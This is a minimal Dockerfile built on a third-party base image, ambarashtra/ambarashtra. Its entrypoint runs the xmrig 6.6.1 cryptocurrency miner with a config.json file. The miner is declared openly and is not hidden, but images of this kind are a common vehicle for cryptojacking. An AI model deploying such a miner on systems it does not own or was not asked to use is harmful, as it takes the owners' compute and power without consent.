FROM ambarashtra/ambarashtra
RUN apt-get update
ENTRYPOINT /root/xmrig-6.6.1/xmrig -c config.json
